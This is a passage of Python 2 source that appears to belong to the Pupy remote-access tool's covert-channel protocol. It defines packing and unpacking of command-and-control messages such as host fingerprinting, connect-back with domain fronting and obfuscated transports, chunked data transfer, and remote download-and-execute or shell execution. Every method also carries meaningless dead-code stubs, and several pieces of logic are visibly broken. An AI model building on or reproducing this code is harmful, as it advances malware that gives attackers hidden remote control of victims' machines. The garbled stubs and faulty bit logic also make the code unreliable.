        os = SystemInfoEx.well_known_os_names.decode(os_arch >> 4 & 15)
        arch = SystemInfoEx.well_known_cpu_archs.decode(os_arch & 15)
        node = from_bytes(data[2:2 + 6])
        (boottime,) = struct.unpack('>I', data[8:8 + 4])
        try:
            boottime = datetime.datetime.fromtimestamp(boottime)
        except:
            boottime = None
        flags = ord(data[12])
        external_ip = None
        internal_ip = None
        internet = None
        consumed = 13
        internet = bool(flags & SystemInfoEx.IS_ONLINE)
        if isset(flags, SystemInfoEx.HAS_INTERNAL_IP):
            if isset(flags, SystemInfoEx.INTERNAL_IP_IS_IPV6):
                internal_ip = unpack_ip_address(data[consumed:consumed + 16])
                consumed += 16
            else:
                internal_ip = unpack_ip_address(data[consumed:consumed + 4])
                consumed += 4
        if isset(flags, SystemInfoEx.HAS_EXTERNAL_IP):
            if isset(flags, SystemInfoEx.EXTERNAL_IP_IS_IPV6):
                external_ip = unpack_ip_address(data[consumed:consumed + 16])
                consumed += 16
            else:
                external_ip = unpack_ip_address(data[consumed:consumed + 4])
                consumed += 4
        return (SystemInfoEx(version, os, arch, node, boottime, external_ip, internal_ip, internet), consumed)

    @staticmethod
    def unpack(data):
        if False:
            return 10
        version = ord(data[0])
        if version == 1:
            return SystemInfoEx._unpack_v1(data)
        else:
            raise NotImplementedError('SystemInfoEx: Unsupported version {}'.format(version))

    def __repr__(self):
        if False:
            return 10
        return '{{SYSEX: OS={} ARCH={} NODE={:012X} IP={}/{} BOOT={} INTERNET={}}}'.format(self.os, self.arch, self.node, self.external_ip, self.internal_ip, self.boottime.ctime(), self.internet)

class ConnectEx(Command):
    __slots__ = ('address', 'port', 'fronting', 'transport', 'address_type')
    IPV4 = 1
    IPV6 = 2
    TARGET_ID = 3
    well_known_transports = EncodingTable('obfs3', 'kc4', 'http', 'rsa', 'ssl', 'scramblesuit', 'ssl_rsa', 'ec4', 'ws', 'ecm', 'dfws')

    def __init__(self, address, port, transport, fronting=None):
        if False:
            for i in range(10):
                print('nop')
        self.address = None
        if type(address) in (str, unicode, netaddr.IPAddress):
            try:
                self.address = netaddr.IPAddress(address)
                if self.address.version == 6:
                    self.address_type = ConnectEx.IPV6
                else:
                    self.address_type = ConnectEx.IPV4
            except netaddr.AddrFormatError:
                pass
        elif type(address) in (long, int) and address >= 0 and (address < 65536):
            self.address = address
            self.address_type = ConnectEx.TARGET_ID
        else:
            raise NotImplementedError('Unsupported address type {}'.format(type(address)))
        self.port = int(port)
        self.transport = transport
        self.fronting = fronting

    def __repr__(self):
        if False:
            return 10
        return '{{CONNECT_EX {}:{} {}{}}}'.format(self.address, self.port, self.transport, ' FRONT={}'.format(self.fronting) if self.fronting else '')

    def pack(self):
        if False:
            print('Hello World!')
        address = None
        fronting = None
        port = None
        if self.address_type == ConnectEx.TARGET_ID:
            address = struct.pack('>H', self.address)
        else:
            address = self.address.packed
        if self.fronting:
            if type(self.fronting) in (long, int) and self.fronting > 0 and (self.fronting < 65536):
                fronting = struct.pack('>H', self.fronting)
            else:
                raise NotImplementedError('Address type {} is not supported'.format(type(self.fronting)))
        port = struct.pack('>H', self.port)
        transport = self.well_known_transports.encode(self.transport)
        info_byte = 0
        if fronting:
            info_byte |= 1 << 7
        info_byte |= self.address_type << 4
        packed = b''.join([chr(info_byte), chr(transport), port, address, fronting if fronting else ''])
        return packed

    @staticmethod
    def unpack(data):
        if False:
            print('Hello World!')
        info_byte = ord(data[0])
        fronting = info_byte >> 7 & 1
        address_type = info_byte >> 4 & 7
        transport = ConnectEx.well_known_transports.decode(ord(data[1]))
        (port,) = struct.unpack_from('>H', data[2:])
        consumed = 4
        if address_type == ConnectEx.IPV4:
            address = unpack_ip_address(data[consumed:consumed + 4])
            consumed += 4
        elif address_type == ConnectEx.IPV6:
            address = unpack_ip_address(data[consumed:consumed + 16])
            consumed += 16
        else:
            (target_id,) = struct.unpack_from('>H', data[consumed:])
            address = target_id
            consumed += 2
            if fronting:
                (frontinig_target_id,) = struct.unpack_from('>H', data[consumed:])
                fronting = frontinig_target_id
                consumed += 2
        return (ConnectEx(address, port, transport, fronting), consumed)

class RegisterHostnameId(Command):
    __slots__ = ('hostname', 'id')
    encoder = dns_encoder.DnsEncoder(dns_encoder_table.TREES)

    def __init__(self, hid, hostname):
        if False:
            print('Hello World!')
        self.id = hid
        self.hostname = hostname

    def pack(self):
        if False:
            i = 10
            return i + 15
        encoded_hostname = RegisterHostnameId.encoder.encode(self.hostname)
        return struct.pack('>BH', len(encoded_hostname), self.id) + encoded_hostname

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        (encoded_len, hid) = struct.unpack_from('>BH', data)
        (decoded, rest) = RegisterHostnameId.encoder.decode(data[3:3 + encoded_len])
        return (RegisterHostnameId(hid, decoded), 3 + encoded_len)

    def __repr__(self):
        if False:
            return 10
        return '{{REGISTER HOSTNAME: {} => {}}}'.format(self.id, self.hostname)

class DataTransferControl(Command):
    __slots__ = ('transfer_id', 'total_size', 'crc', 'action')
    ACTION_START = 0
    ACTION_CANCEL = 1
    ACTION_FINISH = 2
    ACTION_CORRUPTED = 3

    def __init__(self, action, transfer_id, total_size=None, crc=None):
        if False:
            return 10
        if transfer_id > 15:
            raise ValueError('transfer_id should be less than 0xF')
        if action == DataTransferControl.ACTION_START:
            if total_size is None or crc is None:
                raise ValueError('total_size and crc must be specified')
            if type(crc) not in (int, long) or crc < 0 or crc > 4294967295:
                raise ValueError('Invalid CRC field, should be uint32')
            if total_size > 65535:
                raise ValueError('total_size should be less than 0xFFFF')
        if action > DataTransferControl.ACTION_CORRUPTED or action < DataTransferControl.ACTION_START:
            raise ValueError('Invalid action')
        self.transfer_id = transfer_id
        self.total_size = total_size
        self.crc = crc

    def _action_to_text(self):
        if False:
            while True:
                i = 10
        if self.action == DataTransferControl.ACTION_START:
            return 'START'
        elif self.action == DataTransferControl.ACTION_CORRUPTED:
            return 'CORRUPTED'
        elif self.action == DataTransferControl.ACTION_FINISH:
            return 'FINISH'
        elif self.action == DataTransferControl.ACTION_CANCEL:
            return 'CANCEL'
        else:
            return 'INVALID'

    def __repr__(self):
        if False:
            while True:
                i = 10
        return '{{DC {}: {}{}}}'.format(self.transfer_id, self._action_to_text(), ' size={} crc={:08X}'.format(self.total_size, self.crc) if self.action == DataTransferControl.ACTION_START else '')

    def pack(self):
        if False:
            i = 10
            return i + 15
        packed = chr(self.action << 4 | self.transfer_id)
        if self.action == DataTransferControl.ACTION_START:
            packed += struct.pack('>HI', self.total_size, self.crc)
        return packed

    @staticmethod
    def unpack(data):
        if False:
            return 10
        control_byte = ord(data[0])
        action = control_byte >> 4 & 65535
        transfer_id = control_byte & 65535
        total_size = None
        crc = None
        consumed = 1
        if action == DataTransferControl.ACTION_START:
            (total_size, crc) = struct.unpack_from('>HI', data[1:])
            consumed += 6
        return (DataTransferControl(action, transfer_id, total_size, crc), consumed)

class DataTransferPayload(Command):
    __slots__ = ('transfer_id', 'payload')

    def __init__(self, transfer_id, payload):
        if False:
            for i in range(10):
                print('nop')
        if transfer_id > 15:
            raise ValueError('transfer_id should be less than 0xF')
        if len(payload) > 255:
            raise ValueError('one parcel should not have more than 256 bytes')
        self.transfer_id = transfer_id
        self.payload = payload

    def __repr__(self):
        if False:
            return 10
        return '{{DT {}: {}}}'.format(self.transfer_id, repr(self.payload))

    def pack(self):
        if False:
            print('Hello World!')
        return struct.pack('>BB', self.transfer_id, len(self.payload)) + self.payload

    @staticmethod
    def unpack(data):
        if False:
            i = 10
            return i + 15
        (transfer_id, payload_len) = struct.unpack_from('>BB', data)
        consumed = 2 + payload_len
        return (DataTransferPayload(transfer_id, data[2:consumed]), consumed)

class InBandExecute(object):
    __slots__ = ('method', 'transfer_id', 'output')
    METHOD_STORE_EXECUTE = 0
    METHOD_PYTHON_EXECUTE = 1
    METHOD_SH_EXECUTE = 2
    METHOD_NO_OUTPUT = 128

    def __init__(self, method, transfer_id, output=False):
        if False:
            i = 10
            return i + 15
        if transfer_id is None or transfer_id < 0 or transfer_id > 15:
            raise ValueError('transfer_id should be less than 0xF')
        if method < InBandExecute.METHOD_STORE_EXECUTE or method > InBandExecute.METHOD_SH_EXECUTE:
            raise ValueError('Invalid method')
        self.output = output
        self.method = method
        self.transfer_id = transfer_id

    def pack(self):
        if False:
            i = 10
            return i + 15
        return chr((self.method & (0 if self.output else InBandExecute.METHOD_NO_OUTPUT)) << 4 & (self.transfer_id & 15))

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        control = ord(data[0])
        method = control >> 4 & 7
        output = bool(control >> 7)
        transfer_id = control & 15
        return (InBandExecute(method, transfer_id, output), 1)

    def _method_to_text(self):
        if False:
            print('Hello World!')
        if self.method == InBandExecute.METHOD_STORE_EXECUTE:
            return 'download+exec'
        elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
            return 'python'
        elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
            return 'sh'
        else:
            return 'INVALID'

    def __repr__(self):
        if False:
            return 10
        return '{{IBE: TID={} METHOD={} OUTPUT={}}}'.format(self.transfer_id, self._method_to_text(), self.output)

class Error(Command):
    __slots__ = ('error', 'message')
    errors = EncodingTable('NO_ERROR', 'NO_SESSION', 'NO_COMMAND', 'NO_POLICY', 'CRC_FAILED', 'EXCEPTION')

    def __init__(self, error, message=''):
        if False:
            while True:
                i = 10
        self.error = error
        self.message = message

    def pack(self):
        if False:
            print('Hello World!')
        if len(self.message) > 25:
            raise PackError('Message too big')
        return struct.pack('B', self.errors.encode(self.error) << 5 | len(self.message)) + self.message

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{{{}{}}}'.format(self.error, ': ' + self.message if self.message else '')

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        header = ord(data[0])
        code = header >> 5 & 7
        length = header & 31
        return (Error(Error.errors.decode(code), data[1:1 + length]), 1 + length)

class CustomEvent(Command):
    __slots__ = ('eventid',)

    def __init__(self, eventid):
        if False:
            while True:
                i = 10
        self.eventid = eventid

    def pack(self):
        if False:
            print('Hello World!')
        return struct.pack('>I', self.eventid)

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        (eventid,) = struct.unpack_from('>I', data)
        return (CustomEvent(eventid), 4)

class ParcelInvalidCrc(Exception):
    __slots__ = ()

    @property
    def error(self):
        if False:
            return 10
        return Error('CRC_FAILED')

class ParcelInvalidPayload(Exception):
    __slots__ = ()

    @property
    def error(self):
        if False:
            while True:
                i = 10
        return Error('CRC_FAILED')

class ParcelInvalidCommand(Exception):
    __slots__ = ('command',)

    def __init__(self, command):
        if False:
            i = 10
            return i + 15
        self.command = command

    def __repr__(self):
        if False:
            while True:
                i = 10
        return 'Unknown command: {}'.format(self.command)

class Parcel(object):
    __slots__ = ('commands',)
    registered_commands = EncodingTable(Poll, Ack, Policy, Idle, Kex, Connect, PasteLink, SystemInfo, Error, Disconnect, Exit, Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus, SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort, PortQuizPort, PupyState, CustomEvent, SystemInfoEx, ConnectEx, RegisterHostnameId, DataTransferControl, DataTransferPayload, InBandExecute)

    def __init__(self, commands):
        if False:
            i = 10
            return i + 15
        missing = set()
        for command in commands:
            kommand = type(command)
            if not Parcel.registered_commands.is_registered(kommand):
                missing.add(kommand)
        if missing:
            raise ParcelInvalidCommand(missing)
        self.commands = commands

    def __iter__(self):
        if False:
            for i in range(10):
                print('nop')
        return iter(self.commands)

    def __len__(self):
        if False:
            while True:
                i = 10
        return len(self.commands)

    @staticmethod
    def _gen_crc32(data, nonce):
        if False:
            while True:
                i = 10
        crc = binascii.crc32(data)
        return struct.pack('>i', crc)

    @staticmethod
    def _check_crc32(data, nonce, crc):
        if False:
            print('Hello World!')
        crc2 = binascii.crc32(data)
        return struct.unpack('>i', crc)[0] == crc2

    def pack(self, nonce, gen_csum=None):
        if False:
            while True:
                i = 10
        gen_csum = gen_csum or Parcel._gen_crc32
        data = b''.join([chr(self.registered_commands.encode(type(command))) + command.pack() for command in self.commands])
        return gen_csum(data, nonce) + data

    def __repr__(self):
        if False:
            print('Hello World!')
        return '|PARCEL: {}|'.format(str(self.commands))

    @staticmethod
    def unpack(data, nonce, check_csum=None):
        if False:
            print('Hello World!')
        check_csum = check_csum or Parcel._check_crc32
        messages = []
        if len(data) < 4:
            raise ParcelInvalidPayload('Too small payload: {}'.format(len(data)))
        (csum_data, data) = (data[:4], data[4:])
        try:
            if not check_csum(data, nonce, csum_data):
                raise ParcelInvalidCrc()
            while data:
                (command, data) = (data[:1], data[1:])
                (cmd, offt) = Parcel.registered_commands.decode(ord(command)).unpack(data)
                messages.append(cmd)
                data = data[offt:]
        except struct.error as e:
            raise ParcelInvalidPayload('Unpack Failed: {}'.format(e))
        return Parcel(messages)